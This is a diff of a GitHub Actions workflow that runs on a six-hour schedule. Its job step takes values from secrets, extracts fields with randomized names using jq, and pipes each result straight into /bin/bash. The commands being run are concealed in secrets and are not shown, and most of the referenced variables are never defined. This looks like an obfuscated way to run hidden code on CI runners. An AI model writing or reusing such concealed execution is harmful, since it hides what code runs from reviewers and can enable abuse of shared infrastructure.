@@ -2,7 +2,7 @@ name: guoshilun1248
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 2/6 * * *'
+    - cron: '47 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,18 +10,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: guoshilun1248
         env:
-          iple98: ${{ secrets.iple98 }}
+          yl8233: ${{ secrets.yl8233 }}
         run: |
-          echo $iple98 | jq -r .jdlpi65 | /bin/bash
-          echo $phtq819 | jq -r .ldns91 | /bin/bash
-          echo $zie27512 | jq -r .pwb1668 | /bin/bash
-          echo $ejt9 | jq -r .kwxn98 | /bin/bash
-          echo $godl99 | jq -r .muqk55472 | /bin/bash
-          echo $ji88 | jq -r .hg162 | /bin/bash
-          echo $sqspz1 | jq -r .wj20 | /bin/bash
-          echo $ziao7 | jq -r .t7 | /bin/bash
-          echo $g07 | jq -r .heq62154 | /bin/bash
-          echo $g483 | jq -r .ceq02094 | /bin/bash
-          echo $abzv25 | jq -r .kr925 | /bin/bash
-          echo $hv409 | jq -r .i96638 | /bin/bash
+          echo $yl8233 | jq -r .y2369 | /bin/bash
+          echo $rqmo9 | jq -r .izry35 | /bin/bash
+          echo $bq259 | jq -r .jfojo751 | /bin/bash
+          echo $mskz50 | jq -r .bierc9 | /bin/bash
+          echo $udj15 | jq -r .yry0151 | /bin/bash
+          echo $larb9066 | jq -r .t97249 | /bin/bash
+          echo $qsc03646 | jq -r .tgmen386 | /bin/bash
+          echo $tp134 | jq -r .k28268 | /bin/bash
+          echo $i96688 | jq -r .pljh59 | /bin/bash
 
